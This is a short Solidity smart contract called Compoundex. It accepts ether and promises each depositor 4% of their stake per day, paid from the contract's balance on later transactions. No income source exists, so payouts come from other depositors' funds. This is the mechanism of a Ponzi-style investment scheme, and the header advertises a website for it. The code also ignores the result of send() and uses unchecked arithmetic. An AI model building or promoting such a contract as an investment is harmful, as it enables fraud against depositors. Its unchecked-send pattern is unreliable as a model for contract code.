1 pragma solidity ^0.4.24;
2 
3 /**
4  *
5  * Compoundex Contract
6 
7  * RECOMMENDED GAS LIMIT: 70000
8  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
9  *
10  *  Visit compoundex.com for more info
11  */
12 contract Compoundex {
13     // records amounts invested
14     mapping (address => uint256) invested;
15     // records blocks at which investments were made
16     mapping (address => uint256) atBlock;
17 
18     // this function called every time anyone sends a transaction to this contract
19     function () external payable {
20         // if sender (aka YOU) is invested more than 0 ether
21         if (invested[msg.sender] != 0) {
22             // calculate profit amount as such:
23             // amount = (amount invested) * 4% * (blocks since last transaction) / 5900
24             // 5900 is an average block count per day produced by Ethereum blockchain
25             uint256 amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;
26             
27             // send calculated amount of ether directly to sender (aka YOU)
28             address sender = msg.sender;
29             sender.send(amount);
30         }
31 
32         // record block number and invested amount (msg.value) of this transaction
33         atBlock[msg.sender] = block.number;
34         invested[msg.sender] += msg.value;
35     }
36 }